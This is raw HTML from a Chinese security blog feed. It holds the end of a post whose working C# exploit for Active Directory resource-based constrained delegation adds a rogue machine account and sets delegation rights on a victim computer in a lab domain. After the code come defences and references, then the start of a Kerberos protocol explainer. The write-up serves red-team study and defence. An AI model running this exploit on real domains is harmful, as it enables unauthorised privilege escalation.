</span></span><span class="line"><span class="cl">      <span class="n">foreach</span> <span class="p">(</span><span class="n">String</span> <span class="n">DC</span> <span class="n">in</span> <span class="n">DC_array</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="p">{</span> <span class="c1">//DC=redteam
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="c1">//DC=lab
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">          <span class="n">distinguished_name</span> <span class="o">+=</span> <span class="s">&#34;,DC=&#34;</span> <span class="o">+</span> <span class="n">DC</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">          <span class="c1">//distinguished_name=CN=evilpc,CN=computers,DC=redtram,DC=lab
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;[+] Elevate permissions on &#34;</span> <span class="o">+</span> <span class="n">victimcomputer</span><span class="p">);</span> <span class="c1">//[+] Elevate permissions on web2008
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">      <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;[+] Domain = &#34;</span> <span class="o">+</span> <span class="n">Domain</span><span class="p">);</span> <span class="c1">//[+] Domain = redteam.lab
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">      <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;[+] Domain Controller = &#34;</span> <span class="o">+</span> <span class="n">DomainController</span><span class="p">);</span> <span class="c1">//[+] Domain Controller = 192.168.129.130
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">      <span class="p">[</span><span class="c1">//Console.WriteLine](//Console.WriteLine)(&#34;[+] New SAMAccountName = &#34; + sam_account);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">      <span class="p">[</span><span class="c1">//Console.WriteLine](//Console.WriteLine)(&#34;[+] Distinguished Name = &#34; + distinguished_name);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">      <span class="c1">//连接ldap
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">      <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">Protocols</span><span class="p">.</span><span class="n">LdapDirectoryIdentifier</span> <span class="n">identifier</span> <span class="o">=</span> <span class="n">new</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">Protocols</span><span class="p">.</span><span class="n">LdapDirectoryIdentifier</span><span class="p">(</span><span class="n">DomainController</span><span class="p">,</span> <span class="mi">389</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="c1">//NetworkCredential nc = new NetworkCredential(username, password); //使用凭据登录
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">      <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">Protocols</span><span class="p">.</span><span class="n">LdapConnection</span> <span class="n">connection</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="c1">//connection = new System.DirectoryServices.Protocols.LdapConnection(identifier, nc);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">      <span class="n">connection</span> <span class="o">=</span> <span class="n">new</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">Protocols</span><span class="p">.</span><span class="n">LdapConnection</span><span class="p">(</span><span class="n">identifier</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="c1">//域控不允许在未加密的链接中创建计算机用户&#34;。那么上面给的代码为什么是去连接域控389端口(ldap)而不是去连接636端口(ldaps)创建呢？答案是:ldaps需要配置证书才能使用，在默认环境下就不能正常工作，而ldap只要将Sealing属性设置为ture则可以用sasl加密连接。
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">      <span class="n">connection</span><span class="p">.</span><span class="n">SessionOptions</span><span class="p">.</span><span class="n">Sealing</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="n">connection</span><span class="p">.</span><span class="n">SessionOptions</span><span class="p">.</span><span class="n">Signing</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="n">connection</span><span class="p">.</span><span class="n">Bind</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="n">var</span> <span class="n">request</span> <span class="o">=</span> <span class="n">new</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">Protocols</span><span class="p">.</span><span class="n">AddRequest</span><span class="p">(</span><span class="n">distinguished_name</span><span class="p">,</span> <span class="n">new</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">Protocols</span><span class="p">.</span><span class="n">DirectoryAttribute</span><span class="p">[]</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">new</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">Protocols</span><span class="p">.</span><span class="n">DirectoryAttribute</span><span class="p">(</span><span class="s">&#34;DnsHostName&#34;</span><span class="p">,</span> <span class="n">machine_account</span> <span class="o">+</span><span class="s">&#34;.&#34;</span><span class="o">+</span> <span class="n">Domain</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">new</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">Protocols</span><span class="p">.</span><span class="n">DirectoryAttribute</span><span class="p">(</span><span class="s">&#34;SamAccountName&#34;</span><span class="p">,</span> <span class="n">sam_account</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">new</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">Protocols</span><span class="p">.</span><span class="n">DirectoryAttribute</span><span class="p">(</span><span class="s">&#34;userAccountControl&#34;</span><span class="p">,</span> <span class="s">&#34;4096&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">new</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">Protocols</span><span class="p">.</span><span class="n">DirectoryAttribute</span><span class="p">(</span><span class="s">&#34;unicodePwd&#34;</span><span class="p">,</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">Unicode</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\&#34;</span><span class="s">&#34;</span> <span class="o">+</span> <span class="n">new_MachineAccount_password</span> <span class="o">+</span> <span class="s">&#34;</span><span class="se">\&#34;</span><span class="s">&#34;</span><span class="p">)),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">new</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">Protocols</span><span class="p">.</span><span class="n">DirectoryAttribute</span><span class="p">(</span><span class="s">&#34;objectClass&#34;</span><span class="p">,</span> <span class="s">&#34;Computer&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">new</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">Protocols</span><span class="p">.</span><span class="n">DirectoryAttribute</span><span class="p">(</span><span class="s">&#34;ServicePrincipalName&#34;</span><span class="p">,</span> <span class="s">&#34;HOST/&#34;</span><span class="o">+</span><span class="n">machine_account</span><span class="o">+</span><span class="s">&#34;.&#34;</span><span class="o">+</span><span class="n">Domain</span><span class="p">,</span><span class="s">&#34;RestrictedKrbHost/&#34;</span><span class="o">+</span><span class="n">machine_account</span><span class="o">+</span><span class="s">&#34;.&#34;</span><span class="o">+</span><span class="n">Domain</span><span class="p">,</span><span class="s">&#34;HOST/&#34;</span><span class="o">+</span><span class="n">machine_account</span><span class="p">,</span><span class="s">&#34;RestrictedKrbHost/&#34;</span><span class="o">+</span><span class="n">machine_account</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="n">try</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">//添加机器账户
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="n">connection</span><span class="p">.</span><span class="n">SendRequest</span><span class="p">(</span><span class="n">request</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;[+] Machine account: &#34;</span> <span class="o">+</span> <span class="n">machine_account</span> <span class="o">+</span> <span class="s">&#34; Password: &#34;</span> <span class="o">+</span> <span class="n">new_MachineAccount_password</span> <span class="o">+</span> <span class="s">&#34; added&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="n">catch</span> <span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="n">Exception</span> <span class="n">ex</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;[-] The new machine could not be created! User may have reached ms-DS-new_MachineAccountQuota limit.)&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;[-] Exception: &#34;</span> <span class="o">+</span> <span class="n">ex</span><span class="p">.</span><span class="n">Message</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="c1">// 获取新计算机对象的SID
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">      <span class="n">var</span> <span class="n">new_request</span> <span class="o">=</span> <span class="n">new</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">Protocols</span><span class="p">.</span><span class="n">SearchRequest</span><span class="p">(</span><span class="n">distinguished_name</span><span class="p">,</span> <span class="s">&#34;(&amp;(samAccountType=805306369)(|(name=&#34;</span> <span class="o">+</span> <span class="n">machine_account</span> <span class="o">+</span> <span class="s">&#34;)))&#34;</span><span class="p">,</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">Protocols</span><span class="p">.</span><span class="n">SearchScope</span><span class="p">.</span><span class="n">Subtree</span><span class="p">,</span> <span class="n">null</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="n">var</span> <span class="n">new_response</span> <span class="o">=</span> <span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">Protocols</span><span class="p">.</span><span class="n">SearchResponse</span><span class="p">)</span><span class="n">connection</span><span class="p">.</span><span class="n">SendRequest</span><span class="p">(</span><span class="n">new_request</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="n">SecurityIdentifier</span> <span class="n">sid</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="n">foreach</span> <span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">Protocols</span><span class="p">.</span><span class="n">SearchResultEntry</span> <span class="n">entry</span> <span class="n">in</span> <span class="n">new_response</span><span class="p">.</span><span class="n">Entries</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">try</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">          <span class="n">sid</span> <span class="o">=</span> <span class="n">new</span> <span class="n">SecurityIdentifier</span><span class="p">(</span><span class="n">entry</span><span class="p">.</span><span class="n">Attributes</span><span class="p">[</span><span class="s">&#34;objectsid&#34;</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="n">as</span> <span class="n">byte</span><span class="p">[],</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">          <span class="n">Console</span><span class="p">.</span><span class="n">Out</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;[+] &#34;</span> <span class="o">+</span> <span class="n">new_MachineAccount</span> <span class="o">+</span> <span class="s">&#34; SID : &#34;</span> <span class="o">+</span> <span class="n">sid</span><span class="p">.</span><span class="n">Value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">catch</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">          <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;[!] It was not possible to retrieve the SID.</span><span class="se">\n</span><span class="s">Exiting...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">          <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="c1">//设置资源约束委派
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">      <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">DirectoryEntry</span> <span class="n">myldapConnection</span> <span class="o">=</span> <span class="n">new</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">DirectoryEntry</span><span class="p">(</span><span class="s">&#34;redteam.lab&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="n">myldapConnection</span><span class="p">.</span><span class="n">Path</span> <span class="o">=</span> <span class="n">victimcomputer_ldap_path</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="n">myldapConnection</span><span class="p">.</span><span class="n">AuthenticationType</span> <span class="o">=</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">AuthenticationTypes</span><span class="p">.</span><span class="n">Secure</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">DirectorySearcher</span> <span class="n">search</span> <span class="o">=</span> <span class="n">new</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">DirectorySearcher</span><span class="p">(</span><span class="n">myldapConnection</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="c1">//通过ldap找计算机
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">      <span class="n">search</span><span class="p">.</span><span class="n">Filter</span> <span class="o">=</span> <span class="s">&#34;(CN=&#34;</span> <span class="o">+</span> <span class="n">victimcomputer</span> <span class="o">+</span> <span class="s">&#34;)&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="n">string</span><span class="p">[]</span> <span class="n">requiredProperties</span> <span class="o">=</span> <span class="n">new</span> <span class="n">string</span><span class="p">[]</span> <span class="p">{</span> <span class="s">&#34;samaccountname&#34;</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="n">foreach</span> <span class="p">(</span><span class="n">String</span> <span class="n">property</span> <span class="n">in</span> <span class="n">requiredProperties</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">search</span><span class="p">.</span><span class="n">PropertiesToLoad</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">property</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">SearchResult</span> <span class="n">result</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="n">try</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="n">search</span><span class="p">.</span><span class="n">FindOne</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="n">catch</span> <span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="n">Exception</span> <span class="n">ex</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">ex</span><span class="p">.</span><span class="n">Message</span> <span class="o">+</span> <span class="s">&#34;Exiting...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">result</span> <span class="o">!=</span> <span class="n">null</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">DirectoryEntry</span> <span class="n">entryToUpdate</span> <span class="o">=</span> <span class="n">result</span><span class="p">.</span><span class="n">GetDirectoryEntry</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">sec_descriptor</span> <span class="o">=</span> <span class="s">&#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;&#34;</span> <span class="o">+</span> <span class="n">sid</span><span class="p">.</span><span class="n">Value</span> <span class="o">+</span> <span class="s">&#34;)&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">AccessControl</span><span class="p">.</span><span class="n">RawSecurityDescriptor</span> <span class="n">sd</span> <span class="o">=</span> <span class="n">new</span> <span class="n">RawSecurityDescriptor</span><span class="p">(</span><span class="n">sec_descriptor</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">byte</span><span class="p">[]</span> <span class="n">descriptor_buffer</span> <span class="o">=</span> <span class="n">new</span> <span class="n">byte</span><span class="p">[</span><span class="n">sd</span><span class="p">.</span><span class="n">BinaryLength</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">sd</span><span class="p">.</span><span class="n">GetBinaryForm</span><span class="p">(</span><span class="n">descriptor_buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// 添加evilpc的sid到msds-allowedtoactonbehalfofotheridentity中
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="n">entryToUpdate</span><span class="p">.</span><span class="n">Properties</span><span class="p">[</span><span class="s">&#34;msds-allowedtoactonbehalfofotheridentity&#34;</span><span class="p">].</span><span class="n">Value</span> <span class="o">=</span> <span class="n">descriptor_buffer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">try</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">          <span class="n">entryToUpdate</span><span class="p">.</span><span class="n">CommitChanges</span><span class="p">();</span><span class="c1">//提交更改
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">          <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;[+] Exploit successfully!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">catch</span> <span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="n">Exception</span> <span class="n">ex</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">          <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">ex</span><span class="p">.</span><span class="n">Message</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">          <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;[!] </span><span class="se">\n</span><span class="s">Failed...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">          <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><hr>
<h2 id="防御"><strong>防御：</strong></h2>
<p>1.高权限账号设置禁止委派属性</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/54.png" alt="image"></p>
<p>2.微软推出了<strong>protected users组，组内用户不允许被委派</strong>，适用于Windows Server 2016，Windows Server 2012 R2、 Windows Server 2012</p>
<p>Protected Users 组中的帐户只能使用 Kerberos 协议进行身份验证，拒绝 NTLM、Digest 和 CredSSP。</p>
<p>Kerberos拒绝使用 DES 和 RC4 加密类型进行预身份验证 ，域必须配置为支持 AES 或更高版本。</p>
<p>受保护用户的帐户不能通过 Kerberos 约束或无约束委派进行委派。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/55.png" alt="image"></p>
<p>3.kerberos预认证不使用DES或RC4等加密算法（<strong>尽量使用AES256</strong>）同样能够预防<code>Kerberoast</code>攻击</p>
<h2 id="参考"><strong>参考</strong></h2>
<p><a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html</a></p>
<p><a href="https://blog.ateam.qianxin.com/post/wei-ruan-bu-ren-de-0day-zhi-yu-nei-ben-di-ti-quan-lan-fan-qie/">https://blog.ateam.qianxin.com/post/wei-ruan-bu-ren-de-0day-zhi-yu-nei-ben-di-ti-quan-lan-fan-qie/</a></p>
]]></content>
        </item>
        
        <item>
            <title>kerberos利用面</title>
            <link>https://lzzbb.github.io/posts/2021/04/kerberos%E5%88%A9%E7%94%A8%E9%9D%A2/</link>
            <pubDate>Tue, 20 Apr 2021 00:00:00 +0000</pubDate>
            
            <guid>https://lzzbb.github.io/posts/2021/04/kerberos%E5%88%A9%E7%94%A8%E9%9D%A2/</guid>
            <description>kerberos介绍 Kerberos（/ˈkərbərəs/）是一种计算机网络授权协议，用来在非安全网络中，对个人通信以安全的手段进行身份认证。这个词又指麻省理工学院为这个协议开发的一套计算机软件。软件设计上采用客户端/服务器结构，并且能够进行相互认证，即客户端和服务器端均可对对方进行身份认证。
在kerberos协议中有三个角色：
1. Client（访问服务） 2. Server（提供服务） 3. KDC（Key Distribution Cente）密钥分发中心 其中：
KDC（Key Distribution Center）= 密钥分发中心 AS（Authentication Server）= 认证服务器 TGT（Ticket Granting Ticket）= TGT服务票据，由AS在AS-REP发放 TGS（Ticket Granting Server）= 票据授权服务器 ST（Server Ticket）=ST服务票据，由TGS在TGS-REP发放 kerberos协议分析 实验环境： 域名：HIRO 域控：WIN-KONG 域管：hiro\administrator 主机：DESKTOP-P34E60A 域用户:hiro\win10 在win10上执行：
net use \\WIN-KONG\C$ password /u:hiro\administrator
AS-REQ: 1.请求的客户端信息 3.加密类型 4.Authenticator（用户Hash加密时间戳） 客户端通过使用其凭据加密时间戳来执行预身份验证，以向 KDC 证明其拥有该帐户的凭据。使用时间戳而不是静态值有助于防止重放攻击。
AS-REP: 1.通过活动目录查询用户得到用户的Hash，用Hash解密Authenticator，如果解密成功并且时间戳在规定时间内（一般为五分钟），则域认证成功。 2.生成由krbtgt用户Hash加密的TGT认购权证，用于确保客户端和DC进行安全通信的用户Hash加密后的Login Session Key(作为下一阶段的认证秘钥)。 3.返回TGT，Login Session Key，时间戳和PAC。（PAC包含用户SID，所在组等信息）  Ps:KRBTGT在域生成的时候这个用户会被自动创建，是秘钥发行中心服务账户，不能用做登录。
 TGS-REQ: 1.客户端信息 2.Authenticator(Login Session Key加密时间戳) 3.TGT认购权限 4.访问的服务名 因为当前请求目标服务是文件共享，则将TGS提交给CIFS服务访问。
padata：
req-body：</description>
            <content type="html"><![CDATA[<h2 id="kerberos介绍">kerberos介绍</h2>
<p>Kerberos（/ˈkərbərəs/）是一种计算机网络授权协议，用来在非安全网络中，对个人通信以安全的手段进行身份认证。这个词又指麻省理工学院为这个协议开发的一套计算机软件。软件设计上采用客户端/服务器结构，并且能够进行相互认证，即客户端和服务器端均可对对方进行身份认证。</p>
<p>在kerberos协议中有三个角色：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1. Client（访问服务）
</span></span><span class="line"><span class="cl">2. Server（提供服务）
</span></span><span class="line"><span class="cl">3. KDC（Key Distribution Cente）密钥分发中心
</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/1.png" alt=""></p>
<p>其中：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">KDC（Key Distribution Center）= 密钥分发中心
</span></span><span class="line"><span class="cl">AS（Authentication Server）= 认证服务器
</span></span><span class="line"><span class="cl">TGT（Ticket Granting Ticket）= TGT服务票据，由AS在AS-REP发放
</span></span><span class="line"><span class="cl">TGS（Ticket Granting Server）= 票据授权服务器
</span></span><span class="line"><span class="cl">ST（Server Ticket）=ST服务票据，由TGS在TGS-REP发放
</span></span></code></pre></div><h2 id="kerberos协议分析">kerberos协议分析</h2>
<h3 id="实验环境">实验环境：</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">域名：HIRO
</span></span><span class="line"><span class="cl">域控：WIN-KONG 域管：hiro\administrator
</span></span><span class="line"><span class="cl">主机：DESKTOP-P34E60A 域用户:hiro\win10
</span></span></code></pre></div><p>在win10上执行：</p>
<p><code>net use \\WIN-KONG\C$ password /u:hiro\administrator</code></p>
